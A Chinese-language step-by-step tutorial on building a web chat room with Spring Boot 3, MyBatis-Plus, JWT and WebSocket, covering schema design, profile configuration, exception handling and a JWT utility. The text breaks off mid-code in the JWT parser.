# 从零手写一个网页版聊天室：Spring Boot 3 + MyBatis-Plus + JWT + WebSocket 全流程实录

> 这不是一份"运行一下看看效果"的 Demo 说明，而是一份**能让你从空目录一路做到服务器上线**的完整记录。
> 每一段代码都来自一个真实跑通的项目（59 个 Java 类 / 3717 行后端、21 个 REST 接口、1 个 WebSocket 端点、
> 6 张表），并且**凡是踩过的坑都写清了症状、原因和解法**。
>
> 前端代码只讲"和后端有契约关系"的部分（请求头、推送信封、心跳、断线重连），
> 页面布局和 CSS 一律略过 —— 那不是这个项目的重点。
>
> **技术栈**：Java 17 / Spring Boot 3.5.7 / MyBatis-Plus 3.5.5 / MySQL 8 / JWT(jjwt 0.11.5) / 原生 WebSocket
> **线上成品**：`http://101.42.2.204:8082/login.html`

---

## 目录

- [第 0 章 · 先看清我们要做什么](#第-0-章--先看清我们要做什么)
- [第 1 章 · 环境准备与工程骨架](#第-1-章--环境准备与工程骨架)
- [第 2 章 · 数据库设计：6 张表撑起一个聊天室](#第-2-章--数据库设计6-张表撑起一个聊天室)
- [第 3 章 · 配置文件：dev / prod 双 profile](#第-3-章--配置文件dev--prod-双-profile)
- [第 4 章 · 地基：常量、统一异常、JWT、拦截器](#第-4-章--地基常量统一异常jwt拦截器)
- [第 5 章 · 用户模块：注册 / 登录 / 当前用户](#第-5-章--用户模块注册--登录--当前用户)
- [第 6 章 · MyBatis-Plus 使用规范与 6 个必踩的坑](#第-6-章--mybatis-plus-使用规范与-6-个必踩的坑)
- [第 7 章 · 好友模块：申请、接受、拒绝](#第-7-章--好友模块申请接受拒绝)
- [第 8 章 · 会话模块：会话列表与未读游标](#第-8-章--会话模块会话列表与未读游标)
- [第 9 章 · 消息模块：收发、撤回、搜索](#第-9-章--消息模块收发撤回搜索)
- [第 10 章 · WebSocket 深度篇（本项目最核心的一章）](#第-10-章--websocket-深度篇本项目最核心的一章)
- [第 11 章 · 六个扩展功能（课件只给了需求，这里是实现）](#第-11-章--六个扩展功能课件只给了需求这里是实现)
- [第 12 章 · 文件上传与静态资源映射](#第-12-章--文件上传与静态资源映射)
- [第 13 章 · 前端契约（只讲必须知道的部分）](#第-13-章--前端契约只讲必须知道的部分)
- [第 14 章 · 打包与本地自测](#第-14-章--打包与本地自测)
- [第 15 章 · 部署上线全流程（8 个阶段）](#第-15-章--部署上线全流程8-个阶段)
- [第 16 章 · 踩坑总清单（速查表）](#第-16-章--踩坑总清单速查表)
- [第 17 章 · 已知不足与下一步](#第-17-章--已知不足与下一步)
- [附录](#附录)

---

## 第 0 章 · 先看清我们要做什么

### 0.1 成品长什么样

一个网页版聊天室，两个浏览器窗口（或两台设备）登录不同账号，可以：

1. **注册 / 登录**（JWT 鉴权，密码加盐存储）
2. **加好友**：模糊搜索用户 → 发申请（附理由）→ 对方实时收到通知 → 接受 / 拒绝
3. **单聊**：点好友开会话，消息**实时到达**，历史消息可翻
4. **群聊**：拉几个好友建群，群里所有人在线时都能实时收到
5. **未读提示**：会话列表上显示红点数字，点进去自动清零
6. **发图片**：上传后作为消息发出，对方看到图而不是路径
7. **消息搜索**：在自己参与的所有会话里搜关键字
8. **消息撤回**：2 分钟内可撤回，两边都留痕
9. **换头像**：即时生效
10. **断线重连**：网络抖一下自动恢复，并把断线期间的消息补回来

第 1–3 项是这类项目的"正课"（大多数教程也讲到这），**第 4–10 项才是分水岭** —— 它们要求你把"数据一致性、并发、鉴权边界"想清楚，而不是把 CRUD 写一遍。

### 0.2 架构总览

```
浏览器（client.html + client.js）
   │
   ├─── HTTP (REST 21 个接口) ──┐
   │   · 统一带 User-Token 头   │
   │   · 统一 {code,message}    │
   │                            ▼
   └─── WebSocket /ws/message ──┐
       · token 挂在 URL query   │
       · 25s 心跳 / 断线重连     │
                                ▼
        ┌───────────────────────────────────────────┐
        │  LoginInterceptor（JWT 鉴权，把 userId 塞进 request 域）│
        │  GlobalExceptionHandler（统一错误 → 真 HTTP 状态码）   │
        ├───────────────────────────────────────────┤
        │  Controller ×5  →  Service ×5  →  Mapper ×6 │
        ├───────────────────────────────────────────┤
        │  OnlineUserManager（在线连接表 + 定向推送）  │
        │  TxAfterCommit（事务提交后再推送）           │
        │  WebSocketIdleReaper（空闲连接回收）        │
        └───────────────────────────────────────────┘
                                │
                                ▼
                   MySQL 8 · java_chatroom · 6 张表
```

**贯穿全栈的四个横切关注点**（后面每一章都会回到它们）：

| 关注点 | 一句话 |
|---|---|
| 鉴权 | 当前用户身份**只从拦截器放的 request 域取**，绝不从请求参数取 |
| 错误 | 业务异常必须落到**真实的 HTTP 状态码**上 |
| 推送 | 事务里的推送一律**推迟到提交之后** |
| 在线态 | 连接表要能**自愈**（死连接清理 + 空闲回收） |

### 0.3 一张必须记住的对照表：哪些是"教程做法"，哪些是我改的

课件（我参照的教材）讲的是 Spring Boot 2 + 原生 MyBatis + `HttpSession`。本项目用的是更接近生产的一套，**下面这张表就是面试里"你和教程不一样在哪"的答案**：

| 维度 | 教程做法 | 本项目 | 为什么改 |
|---|---|---|---|
| 框架 | SB2 + 原生 MyBatis + 3 个 XML mapper | **SB 3.5.7 + MyBatis-Plus 3.5.5（`@Select` 注解，零 XML）** | 注解 SQL 与代码同文件，review 时不用来回跳 |
| 鉴权 | `HttpSession` + `session.getAttribute("user")` | **JWT（请求头 `User-Token`）+ 拦截器** | 无状态，天然适配 WebSocket 与多端；服务器重启不掉线 |
| 密码 | 明文 `varchar(20)` | **MD5 + 每用户随机盐，64 位** | 至少不裸存；也知道它的上限（见第 17 章） |
| 登录失败 | HTTP **200** + `{userId: 0}` 业务标记 | **真 HTTP 状态码** + `{code, message}` | HTTP 语义可信，前端能走标准错误分支 |
| 异常 | `e.printStackTrace()` 吞掉 | 全局异常处理器 + 自定义业务异常 | 错误可见、返回体统一 |
| 在线表 | `Map<userId, session>` **一对一**，作者原话"禁止用户多开" | `Map<userId, Set<session>>` **支持多标签页** | 真实用户就是会开多个标签页；一对一会把前面的连接顶掉 |
| 推送范围 | 只推对方 | 广播给会话内**所有成员，含发送者自己** | 前端不做本地回显 —— 漏掉自己就变成"只有对方看得见" |
| 断线 | `onclose` 只 `console.log` | 心跳 + 指数退避重连 + **重连后补拉** | 移动网络下断线是常态 |
| 部署 | 没讲 | systemd 托管 + 环境变量注入 + 完整手册 | "最后一公里"，也是最容易翻车的一公里 |

---

## 第 1 章 · 环境准备与工程骨架

### 1.1 需要装什么

| 软件 | 版本 | 说明 |
|---|---|---|
| JDK | **17** | Spring Boot 3 的最低要求；别用 8，`jakarta.*` 命名空间对不上 |
| Maven | 3.9.x | IDEA 自带的也行（后面会讲为什么"自带"会带来一个坑） |
| MySQL | **8.0** | 用到 `utf8mb4`、`caching_sha2_password` 等特性 |
| IDEA | 社区版足够 | 社区版没有 Spring 面板，但不影响这个项目 |

### 1.2 建工程

IDEA → New Project → Spring Initializr：

- 语言 Java、类型 Maven、JDK 17
- Group `com.example`、Artifact **`web-chatroom`**
- 依赖先勾 **Spring Web**、**Lombok**、**MySQL Driver**，其余靠 `pom.xml` 手写

### 1.3 pom.xml：依赖逐条说清

```xml
<parent>
    <groupId>org.springframework.boot</groupId>
    <artifactId>spring-boot-starter-parent</artifactId>
    <version>3.5.7</version>
</parent>

<properties>
    <java.version>17</java.version>
</properties>

<dependencies>
    <!-- 1. Web：内嵌 Tomcat + Spring MVC，也是静态资源的载体 -->
    <dependency>
        <groupId>org.springframework.boot</groupId>
        <artifactId>spring-boot-starter-web</artifactId>
    </dependency>

    <!-- 2. Lombok：@Data / @Slf4j，省掉 getter/setter 和 log 字段 -->
    <dependency>
        <groupId>org.projectlombok</groupId>
        <artifactId>lombok</artifactId>
        <optional>true</optional>
    </dependency>

    <!-- 3. MySQL 驱动，运行时才需要 -->
    <dependency>
        <groupId>com.mysql</groupId>
        <artifactId>mysql-connector-j</artifactId>
        <scope>runtime</scope>
    </dependency>

    <!-- 4. MyBatis-Plus：注意是 spring-boot3 那个 starter，不是 spring-boot 版 -->
    <dependency>
        <groupId>com.baomidou</groupId>
        <artifactId>mybatis-plus-spring-boot3-starter</artifactId>
        <version>3.5.5</version>
    </dependency>

    <!-- 5. 参数校验：@Validated / @NotBlank -->
    <dependency>
        <groupId>org.springframework.boot</groupId>
        <artifactId>spring-boot-starter-validation</artifactId>
    </dependency>

    <!-- 6. WebSocket：用 Spring 原生那套（为什么不用 JSR-356 见第 10 章） -->
    <dependency>
        <groupId>org.springframework.boot</groupId>
        <artifactId>spring-boot-starter-websocket</artifactId>
    </dependency>

    <!-- 7. JWT：jjwt 要引三个包，少一个就运行期报错（见下方说明） -->
    <dependency>
        <groupId>io.jsonwebtoken</groupId>
        <artifactId>jjwt-api</artifactId>
        <version>0.11.5</version>
    </dependency>
    <dependency>
        <groupId>io.jsonwebtoken</groupId>
        <artifactId>jjwt-impl</artifactId>
        <version>0.11.5</version>
        <scope>runtime</scope>
    </dependency>
    <dependency>
        <groupId>io.jsonwebtoken</groupId>
        <artifactId>jjwt-jackson</artifactId>
        <version>0.11.5</version>
        <scope>runtime</scope>
    </dependency>
</dependencies>
```

**两个容易卡住的点**：

1. **MyBatis-Plus 一定要用 `mybatis-plus-spring-boot3-starter`。** 用老的 `mybatis-plus-boot-starter` 在 Spring Boot 3 下会因为自动配置类仍写在 `META-INF/spring.factories` 里而**静默失效** —— 表现是 Mapper 全部注入不进来，报 `No qualifying bean`。
2. **jjwt 拆成了 `api` / `impl` / `jackson` 三个包。** `api` 是编译期用的接口，后两个是运行期实现 —— 只引 `api` 能编译通过、启动即报 `Unable to load class io.jsonwebtoken.impl.DefaultJwtBuilder`。这是"编译期没错、运行期炸"的典型，第一次遇到很难想到是依赖问题。

### 1.4 包结构（一开始就定好，后面不用返工）

```
com.example.chatroom
├── ChatroomApplication            启动类
├── controller                     4 + 1 个（含头像读取）
├── service                        接口
│   └── impl                       实现
├── mapper                         6 个，每张表一个
├── pojo
│   ├── dataobject                 6 个表实体（字段与列一一对应）
│   ├── request                    入参 DTO
│   └── response                   出参 DTO（含 WebSocket 推送信封）
├── config                         WebConfig / WebSocketConfig / UploadConfig
└── common
    ├── constant/Constant          所有常量（头名、claim 键、WS 类型、窗口时长）
    ├── interceptor                登录拦截器 / 日志拦截器
    ├── websocket                  OnlineUserManager / 握手鉴权 / 处理器 / 空闲回收
    ├── utils                      JwtUtil / Md5Util / BeanTransfer / TxAfterCommit
    └── exception                  UserException / GlobalExceptionHandler
```

**`pojo` 拆成三个子包的规矩**（这条规矩能帮你省掉一个很难查的 bug）：

> **表实体（dataobject）和接口返回体（response）必须是两个类。**
>
> 原因：表实体上有 `@JsonInclude(NON_NULL)` 时，join 查询出来的"表里没有的字段"（比如 `fromUserName`）会被序列化器当成 null 一起干掉，前端读到 `undefined`。
> 更根本的原因是：**表结构会变、接口契约也会变，把两者绑成一个类，改一个就动全身。**

**静态资源放在 `src/main/resources/static/`**：

```
static/
├── login.html / register.html / client.html
├── css/  common.css / login.css / register.css / client.css
├── js/   client.js
├── image/
└── favicon.ico
```

---

## 第 2 章 · 数据库设计：6 张表撑起一个聊天室

先说结论 —— **一个能聊天、能加好友、能建群、能记未读、能撤回的聊天室，只需要 6 张表**：

| 表 | 一句话职责 | 关键设计 |
|---|---|---|
| `user` | 用户 | 密码 64 位密文、头像存路径不存 base64 |
| `friend` | 好友关系 | **双向存储**，联合主键 |
| `add_friend_request` | 好友申请 | 联合主键天然防重复申请 |
| `message_session` | 会话（单聊 + 群聊共用） | `type` 区分，`last_time` 用于排序 |
| `message_session_user` | 会话成员 | **只加了 `last_read_message_id` 一列，就撑起了未读功能** |
| `message` | 消息 | 软删除 `revoked` + 复用一个 `content` 列 |

### 2.1 完整的建表脚本

```sql
-- utf8mb4 而不是 utf8：MySQL 的 "utf8" 只有 3 字节，存不了 emoji。
-- 聊天室里表情很常见，用 utf8 会在插入时报 Incorrect string value。
create database if not exists java_chatroom default charset utf8mb4;
use java_chatroom;

-- ============ 1. 用户表 ============
create table user (
    user_id   int primary key auto_increment,
    user_name varchar(20) unique,
    -- 密文 = 32 位 MD5 + 32 位盐，共 64 位，字段必须留够长度
    password  varchar(64),
    -- 头像的相对路径，如 /upload/avatar/4_9f2c.png；NULL = 前端用首字母色块兜底
    avatar    varchar(255) default null
) engine = InnoDB default charset = utf8mb4 comment = '用户表';

-- ============ 2. 好友关系表 ============
-- 双向存储：A 加 B 成功后同时插入 (A,B) 和 (B,A) 两条记录
create table friend (
    user_id   int not null comment '用户 id',
    friend_id int not null comment '好友的 user_id',
    primary key (user_id, friend_id)
) engine = InnoDB default charset = utf8mb4 comment = '好友关系表';

-- ============ 3. 添加好友请求表 ============
create table add_friend_request (
    from_user_id int          not null comment '请求是谁发的',
    to_user_id   int          not null comment '请求要发给谁',
    reason       varchar(100) not null default '' comment '添加好友的理由',
    primary key (from_user_id, to_user_id)
) engine = InnoDB default charset = utf8mb4 comment = '添加好友请求表';

-- ============ 4. 会话表 ============
-- 单聊和群聊共用这张表，靠 type 区分：
--   单聊：name 为 NULL，标题取"对方的昵称"（查出来的，不是存出来的）
--   群聊：name 是群名
create table message_session (
    session_id int primary key auto_increment,
    type       tinyint     not null default 1 comment '会话类型：1 单聊，2 群聊',
    name       varchar(64) default null comment '群名称，单聊为 NULL',
    last_time  datetime    default null comment '最后一条消息的时间，用于会话列表排序'
) engine = InnoDB default charset = utf8mb4 comment = '会话表';

-- ============ 5. 会话成员表 ============
-- 1 对 1 会话这里会有 2 行：(session_id, 我) 和 (session_id, 对方)
-- 联合主键顺带防止同一个人被重复加进同一个会话
create table message_session_user (
    session_id           int not null,
    user_id              int not null,
    last_read_message_id int not null default 0 comment '已读游标：已读到的最大 message_id，0 表示全未读',
    primary key (session_id, user_id),
    key idx_msu_user (user_id)
) engine = InnoDB default charset = utf8mb4 comment = '会话成员表';

-- ============ 6. 消息表 ============
create table message (
    message_id int primary key auto_increment,
    from_id    int           default null comment '发送者 user_id',
    session_id int           default null comment '所属会话',
    content    varchar(2048) default null comment '消息内容；type=2 时存图片路径',
    post_time  datetime      default null comment '发送时间',
    revoked    tinyint(1)    not null default 0 comment '是否已撤回：0 正常，1 已撤回',
    type       tinyint       not null default 1 comment '消息类型：1 文本，2 图片',
    key idx_msg_session_time (session_id, post_time)
) engine = InnoDB default charset = utf8mb4 comment = '消息表';
```

### 2.2 五个设计决策，每个都能讲一段

**① 好友关系为什么"双向存两条"？**

因为查询简单得多。查"我的好友列表"就是一句：

```sql
select u.user_id, u.user_name from friend f join user u on f.friend_id = u.user_id where f.user_id = ?
```

如果只存一条 `(小的id, 大的id)`，那么每次查询都要写成 `where user_id = ? or friend_id = ?` 再判断"另一头是谁"，写起来别扭、索引也用不痛快。**代价**是加好友时要插两条（放进同一个事务里）。

**② 会话成员表为什么用 `(session_id, user_id)` 联合主键？**

三个好处一次拿到：

- **防重复**：同一个人不可能被加进同一个会话两次（数据库层面保证，不靠应用代码）
- **查询快**：`where session_id = ?` 走主键前缀，`where user_id = ?` 走 `idx_msu_user`
- **天然支持群聊**：成员表本来就是多对多 —— 单聊是 2 行，群聊是 N 行。**所以群聊一个字段都不加，只给 `message_session` 加了 `type` 和 `name`**（第 11 章详述）

**③ 未读功能为什么只加一列就够了？**

`message_session_user.last_read_message_id` = "这个人在这条会话里读到哪条消息了"。于是：

```
未读数 = 这条会话里  message_id > 我的游标  and  from_id <> 我  的消息条数
```

不维护任何计数器、不需要"读一条减一"的同步操作 —— **状态只有"我读到哪"，剩下的全靠算**。（第 8 章讲完整实现和并发安全）

**④ 消息表为什么要 `revoked` 而不是直接 `delete`？**

撤回要在双方界面上留一行"XX 撤回了一条消息"的痕迹。物理删掉就没法渲染这一行，而且**超时校验也没法做了**（得查得到原发布时间才能判断"是否超过 2 分钟"）。软删除的代价只是每查一次都要带 `revoked` 过滤。

**⑤ 图片为什么不单开一列？**

图片消息把路径存在 `content` 里，用 `type` 决定前端渲染成文本还是 `<img>`。

> 如果给每种消息类型（图片/语音/文件/位置）单开一列，表会越来越宽、每加一种类型就要 `alter table`。**复用一个 `content` 列 + 一个 `type` 枚举，扩展性明显更好。**

**关于列名，有一条铁律**：

> 🔴 **所有列名必须蛇形（下划线），不能是驼峰。**
> 因为 MyBatis-Plus 生成 SQL 时会把实体驼峰字段名按 `tableUnderline` 规则转成蛇形（默认开启），
> 库里列名写成驼峰的话，MP 生成的 `session_id` 会和真实列 `sessionId` 对不上，直接报 `Unknown column`。

**索引方面**：`message` 表的复合索引 `idx_msg_session_time (session_id, post_time)` 同时服务两类高频查询 ——
"按会话查历史消息"和"取某会话最后一条消息"，两者都是 `where session_id = ? order by post_time`。

### 2.3 测试数据（可选但强烈建议）

为了不用每次都在页面上注册，可以在建库脚本末尾插入两个账号。密码密文用项目的算法手算：

```
密文 = md5(密码 + 盐) + 盐        （盐 32 位随机，密文共 64 位）
```

```sql
insert ignore into user (user_name, password) values
    ('wangwu',   '5ae2fe3b...（64位密文）'),
    ('xiaodudu', '503b8ffa...（64位密文）');

-- 让两人互为好友（用子查询取 id，不写死，避免和自增值对不上）
insert ignore into friend (user_id, friend_id)
select a.user_id, b.user_id from user a, user b
where a.user_name = 'wangwu' and b.user_name = 'xiaodudu';
-- 反方向再来一次
insert ignore into friend (user_id, friend_id)
select a.user_id, b.user_id from user a, user b
where a.user_name = 'xiaodudu' and b.user_name = 'wangwu';
```

> ⚠️ 弱密码 `123456` 只适合"自己临时验一下"，正式对外之前记得删掉。

---

## 第 3 章 · 配置文件：dev / prod 双 profile

配置看起来最简单，**但这里的坑能让你排查半天**。

### 3.1 基线配置 `application.yml`

```yaml
spring:
  datasource:
    url: jdbc:mysql://127.0.0.1:3306/java_chatroom?characterEncoding=utf8&useSSL=false
    # 用环境变量覆盖，本地开发走冒号后面的默认值。
    # ⚠️ 默认值本身就写在仓库里，对"公开的仓库"来说等于没隐藏 ——
    #    真上线应改成 ${DB_USERNAME}（不带默认值），忘注入就直接启动失败。
    username: ${DB_USERNAME:root}
    password: ${DB_PASSWORD:118523}
    driver-class-name: com.mysql.cj.jdbc.Driver

  web:
    resources:
      cache:
        cachecontrol:
          no-cache: true          # 开发期别让浏览器缓存静态资源

  servlet:
    multipart:
      # Spring Boot 默认只有 1MB，传张手机截图就被拒了
      max-file-size: 5MB
      max-request-size: 10MB

  profiles:
    active: ${SPRING_PROFILES_ACTIVE:dev}

mybatis-plus:
  configuration:
    # 注意这里没有 log-impl —— 打印 SQL 属于"开发期才要"的配置，放到 dev profile 里
    map-underscore-to-camel-case: true

jwt:
  secret: ${JWT_SECRET:+JEq/o2bYDEtaECkxKCeAt0i3yA0IPUlV2rxFVGS+v4=}

file:
  upload-dir: ${UPLOAD_DIR:./upload}

websocket:
  # 多久没收到任何帧就认定连接死了，由 WebSocketIdleReaper 定时回收
  session-idle-timeout-ms: ${WS_SESSION_IDLE_TIMEOUT_MS:120000}
  reap-interval-ms: ${WS_REAP_INTERVAL_MS:30000}

logging:
  file:
    name: logs/chatroom.log
```

### 3.2 开发期配置 `application-dev.yml`

```yaml
mybatis-plus:
  configuration:
    # 把 SQL、参数、返回行数打到控制台 —— 学习和排错太有用了
    log-impl: org.apache.ibatis.logging.stdout.StdOutImpl

logging:
  level:
    com.example.chatroom: debug

spring:
  web:
    resources:
      static-locations: file:src/main/resources/static/,classpath:/static/
```

### 3.3 三个"看着多余、其实救命"的配置

**① 为什么生产环境没有 `application-prod.yml` 却要写 `SPRING_PROFILES_ACTIVE=prod`？**

不是问题。Spring Boot 找不到某个 profile 的配置文件，只是"不叠加额外配置"，不会报错。
写 `prod` 的真正目的是**把 dev 里那些"只该在开发期生效的东西"关掉**：
SQL 日志（会爆炸 + 参数里可能带敏感数据）、以及下面这条静态资源路径。

**② `static-locations: file:src/main/resources/static/` 是干什么的？**

`mvn spring-boot:run` **只在启动那一刻**把 `src/main/resources` 拷到 `target/classes`。
之后你改 CSS/JS/HTML，服务器发的还是那份旧的 —— 会出现"我明明改了却没反应"，
**很容易误判成选择器写错了或者代码没保存，白排查半天。**

加上这条之后，静态资源直接从源码目录读，改完刷新浏览器就生效、不用重启。

两个位置都留着是有意的：`file:` 是相对"工作目录"的，只有从项目根目录启动才存在；
万一解析不到，后面的 `classpath:/static/` 会兜住，**所以不会出现"静态资源全 404"**。
而且它只在 dev 生效，**打包上线的 jar 走的还是 classpath**。

**③ 敏感项写 `${ENV:默认值}` 而不是 `${ENV}`，是好事还是坏事？**

本地开发方便，**但上线时是隐患**：默认值就写在仓库里，忘了注入环境变量时程序会**悄悄用默认值跑起来**
（连的还是 `root` 账号、JWT 密钥还是公开的那串）。

**正确做法（也是能写进面试答案的一句话）**：

> 上线前把默认值删掉 —— `${DB_PASSWORD:118523}` 改成 `${DB_PASSWORD}`。
> 这样忘了注入会**启动失败并明确报错**，而不是**拿着一串公开在仓库里的弱密码悄悄跑起来**。
> 这叫 **fail fast（快速失败）优于带默认值继续跑**。

> ⚠️ 上线时这一次我是靠环境变量覆盖的，**`application.yml` 里的默认值还没来得及删**。
> 这是需要补的一项（见第 17 章）。

---

## 第 4 章 · 地基：常量、统一异常、JWT、拦截器

**先打地基再写业务** —— 这一章的东西看着和"聊天"没关系，但它们决定了后面所有代码的写法。
先花两小时做完，后面能省两天。

### 4.1 Constant：所有魔法字符串集中一处

```java
public class Constant {
    /** 前端携带 token 的请求头名 */
    public static final String USER_TOKEN_HEADER = "User-Token";
    /** JWT 中存放用户 id 的 claim 键 */
    public static final String JWT_CLAIM_ID = "userId";
    /** JWT 中存放用户名的 claim 键 */
    public static final String JWT_CLAIM_NAME = "username";
    /** 登录校验通过后，放到 request 域中的当前用户 id */
    public static final String CURRENT_USER_ID = "currentUserId";
    public static final String CURRENT_USER_NAME = "currentUserName";

    /** WebSocket 握手路径 */
    public static final String WS_MESSAGE_PATH = "/ws/message";
    /** WebSocket 握手时携带 token 的 query 参数名 */
    public static final String WS_TOKEN_PARAM = "token";

    // WebSocket 推送类型（前端按 type 分发）
    public static final String WS_TYPE_MESSAGE = "message";
    public static final String WS_TYPE_ADD_FRIEND_REQUEST = "addFriendRequest";
    public static final String WS_TYPE_ACCEPT_FRIEND = "acceptFriend";
    public static final String WS_TYPE_REVOKE = "revoke";
    public static final String WS_TYPE_ERROR = "error";
    public static final String WS_TYPE_GROUP_CREATED = "groupCreated";
    // 应用层心跳（浏览器不给 ping API，自己造一对）
    public static final String WS_TYPE_PING = "ping";
    public static final String WS_TYPE_PONG = "pong";
    /** 连接"最后活跃时间"存在 session.attributes 里用的 key */
    public static final String WS_SESSION_LAST_ACTIVE = "lastActiveAt";

    /** 消息可撤回的时间窗口（分钟） */
    public static final int REVOKE_WINDOW_MINUTES = 2;

    public static final int SESSION_TYPE_SINGLE = 1;
    public static final int SESSION_TYPE_GROUP = 2;
    public static final int MSG_TYPE_TEXT = 1;
    public static final int MSG_TYPE_IMAGE = 2;

    public static final String UPLOAD_URL_PREFIX = "/upload";
    public static final String AVATAR_DIR = "avatar";
    public static final String CHAT_IMAGE_DIR = "chat";
}
```

**为什么值得单独建一个类？**

因为 token 是"一处生成、多处解析"的。生成端写 `map.put("userId", id)`、解析端写 `claims.get("userId")` ——
哪天想把 claim 改名成 `uid`，靠全局搜索字符串一定会有漏网的，而漏掉的那处**不会编译报错，只会在运行期拿到 null**。
放进 `Constant` 之后，改名就是改一个常量，编译器帮你找齐所有引用。

### 4.2 统一异常：`UserException` + `GlobalExceptionHandler`

**自定义业务异常**（`UserException`）：

```java
@Getter
public class UserException extends RuntimeException {
    private final Integer code;
    private final String message;

    public UserException(Integer code, String message) {
        this.code = code;
        this.message = message;
    }

    /** 最常用：400 + 具体原因 */
    public UserException(String message) {
        this.code = 400;
        this.message = message;
    }
}
```

**全局处理器**（`GlobalExceptionHandler`，`@RestControllerAdvice`）—— 这里有 **3 个必须踩过才知道的坑**：

```java
@Slf4j
@RestControllerAdvice
public class GlobalExceptionHandler {

    /** ① 静态资源/接口不存在：正常 404，只打一行日志、不打堆栈 */
    @ExceptionHandler(NoResourceFoundException.class)
    @ResponseStatus(HttpStatus.NOT_FOUND)
    public Map<String, Object> handleNoResourceFound(NoResourceFoundException e) {
        log.warn("资源不存在：{}", e.getResourcePath());
        return Map.of("code", 404, "message", "资源不存在");
    }

    /**
     * ② 业务异常。
     * ⚠️ 必须把 code 落到【真正的 HTTP 状态码】上，不能只在 body 里带一个 code 字段。
     */
    @ExceptionHandler(UserException.class)
    public ResponseEntity<Map<String, Object>> handleUserException(UserException e) {
        log.warn("业务异常：{}", e.getMessage());
        return ResponseEntity.status(httpStatusOf(e.getCode()))
                .body(Map.of("code", e.getCode(), "message", e.getMessage()));
    }

    private static HttpStatus httpStatusOf(Integer code) {
        HttpStatus status = (code == null) ? null : HttpStatus.resolve(code);
        return status != null ? status : HttpStatus.BAD_REQUEST;   // 非法 code 兜底成 400
    }

    /**
     * ③ Spring MVC 自己抛的「协议级」异常：方法用错 / JSON 格式错 / 缺参数 / 参数类型错 / Content-Type 不支持。
     * ⚠️ 这些必须在下面那个 Exception 兜底 handler 之前被拦下，否则会被一起吞成 500。
     */
    @ExceptionHandler({
            HttpRequestMethodNotSupportedException.class,
            HttpMessageNotReadableException.class,
            MissingServletRequestParameterException.class,
            MissingServletRequestPartException.class,
            MethodArgumentTypeMismatchException.class,
            HttpMediaTypeNotSupportedException.class,
            HttpMediaTypeNotAcceptableException.class
    })
    public ResponseEntity<Map<String, Object>> handleSpringMvcException(Exception e) {
        // 这些异常都实现了 ErrorResponse，自带正确的状态码（405/400/415/406），直接取，不要自己猜
        int status = (e instanceof ErrorResponse er)
                ? er.getStatusCode().value()
                : HttpStatus.BAD_REQUEST.value();
        log.warn("请求不合法：{} -> {}", e.getClass().getSimpleName(), e.getMessage());
        return ResponseEntity.status(status)
                .body(Map.of("code", status, "message", e.getMessage()));
    }

    /** ④ 上传超限应该返 413，而不是 500 */
    @ExceptionHandler(MaxUploadSizeExceededException.class)
    public ResponseEntity<Map<String, Object>> handleMaxUploadSize(MaxUploadSizeExceededException e) {
        return ResponseEntity.status(HttpStatus.PAYLOAD_TOO_LARGE)
                .body(Map.of("code", 413, "message", "文件太大了，请选择更小的文件"));
    }

    /** ⑤ @Validated 参数校验失败 */
    @ExceptionHandler(MethodArgumentNotValidException.class)
    @ResponseStatus(HttpStatus.BAD_REQUEST)
    public Map<String, Object> handleValidException(MethodArgumentNotValidException e) {
        String message = e.getBindingResult().getFieldError() != null
                ? e.getBindingResult().getFieldError().getDefaultMessage()
                : "参数校验失败";
        log.warn("参数校验失败：{}", message);
        return Map.of("code", 400, "message", message);
    }

    /** ⑥ 最后的兜底 */
    @ExceptionHandler(Exception.class)
    @ResponseStatus(HttpStatus.INTERNAL_SERVER_ERROR)
    public Map<String, Object> handleException(Exception e) {
        log.error("系统异常", e);
        return Map.of("code", 500, "message", "服务器内部错误");
    }
}
```

#### 🔴 坑 1：业务异常只塞 body 不塞 HTTP 状态码 = 前端"点了没反应"

我最初写的是 `@ResponseStatus` 之外再往 body 里放 `{"code":400}`，HTTP 状态仍是 **200**。后果：

- jQuery 的 `$.ajax` 看到 2xx 会走 **`success`** 而不是 `error`；
- 前端所有"失败时 `alert(原因)`"的代码都在 `error` 分支里 → **永远不执行**；
- 用户在界面上看到的是**点了没反应**；
- 更隐蔽的是：`success` 分支还会照常读取业务字段（如 `body.sessionId`），拿到 `undefined` 之后再往下写，报出更难懂的错。

**改法**：用 `ResponseEntity.status(...)`，让 HTTP 状态码和业务语义一致。这也解释了为什么拦截器的 401 要返回**真 401** —— 两边保持一致，前端才能用一套逻辑处理。

> 配套改前端：登录/注册页的 `error` 分支必须**优先显示后端给的 message**，
> 否则"用户名或密码错误"会被 jQuery 的默认文案盖成笼统的"请求参数有误"。

#### 🔴 坑 2：`@ExceptionHandler(Exception.class)` 会把协议级异常一起吃掉

下面的类型本来是 405 / 400 / 415，如果被兜底 handler 接走，全部变成 **500「服务器内部错误」**：

| 触发场景 | 本该 | 被吞后 |
|---|---|---|
| GET 接口被 POST 打 | 405 | 500 |
| 请求体 JSON 格式错 | 400 | 500 |
| 少传必填参数 | 400 | 500 |
| 参数类型不对（`sessionId=abc`） | 400 | 500 |

**用户以为后端崩了，实际上后端好得很** —— 这是最容易把排查带偏的一类错误。

**改法**：单列一条 handler 把这些类型枚举出来。
Spring 挑 handler 遵循**子类优先、精确优先**，所以列出来的类型不会走到兜底那一条。

#### 🔴 坑 3：上传超限如果不单独处理，会变成 500

`MaxUploadSizeExceededException` 属于"业务能说清"的错误（文件太大），
前端需要的是 **413** 和一句人话，而不是"服务器内部错误"。

### 4.3 JWT 工具

```java
@Component
@Slf4j
public class JwtUtil {
    /** 7 天。短一点更安全，但用户会频繁被踢，这个项目取个折中 */
    public static final long EXPIRATION_TIME = 7 * 24 * 60 * 60 * 1000L;

    private final Key key;

    // 注意 @Value 是 Spring 的，别导错包（IntelliJ 容易自动导入 lombok 的同名注解）
    public JwtUtil(@Value("${jwt.secret}") String secretString) {
        // jwt.secret 是 Base64 字符串，decode 之后才是 HMAC 的 key
        this.key = Keys.hmacShaKeyFor(Decoders.BASE64.decode(secretString));
    }

    public String genJwt(Map<String, Object> claims) {
        return Jwts.builder()
                .setClaims(claims)
                .setIssuedAt(new Date())
                .setExpiration(new Date(System.currentTimeMillis() + EXPIRATION_TIME))
                .signWith(key)          // 用 key 的算法（HS256/384/512）自动选
                .compact();
    }

    /** 解析失败（过期 / 篡改 / 格式错）统一返回 null，由调用方决定怎么拒绝 */
    public Claims parseJwt(String token) {
        JwtParser jwtParser = Jwts.parserBuilder().setSigningKey(key).build();
        try {
            return jwtParser.parseClaimsJws(token).getBody();
        } catch (Exception e) {
            log.warn("token 解析失败：{}", e.getMessage());
